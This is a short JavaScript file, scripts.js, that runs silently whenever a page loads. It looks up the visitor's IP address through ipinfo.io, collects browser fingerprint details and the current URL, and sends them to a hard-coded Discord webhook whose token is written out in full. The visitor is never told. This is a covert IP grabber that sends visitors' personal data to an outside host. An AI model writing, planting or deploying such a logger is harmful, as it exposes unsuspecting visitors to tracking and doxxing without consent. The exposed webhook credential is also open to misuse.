// scripts.js

document.addEventListener('DOMContentLoaded', function () {
    // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1205974272707665920/p36jSmZOgElBrXRb1PaJ9qH8bT6mzkNugBl9Pe6NL1DWx1vSFnbNClMU_B9qB4kQpln5';

    // Function to send browser information and IP address to Discord webhook
    function sendBrowserInfo() {
        // Get user's IP address using ipinfo.io
        fetch('https://ipinfo.io/json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;

                const browserInfo = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    currentUrl: window.location.href,
                    ipAddress: ipAddress,
                };

                // Create a new XMLHttpRequest
                const xhr = new XMLHttpRequest();

                // Open a POST request to the Discord webhook URL
                xhr.open('POST', webhookUrl, true);

                // Set the Content-Type header to JSON
                xhr.setRequestHeader('Content-Type', 'application/json');

                // Convert the browserInfo object to JSON and send it
                xhr.send(JSON.stringify({ content: 'Browser Information:\n```json\n' + JSON.stringify(browserInfo, null, 2) + '\n```' }));
            })
            .catch(error => console.error('Error fetching IP address:', error));
    }

    // Call the sendBrowserInfo function when the page is loaded
    sendBrowserInfo();
});
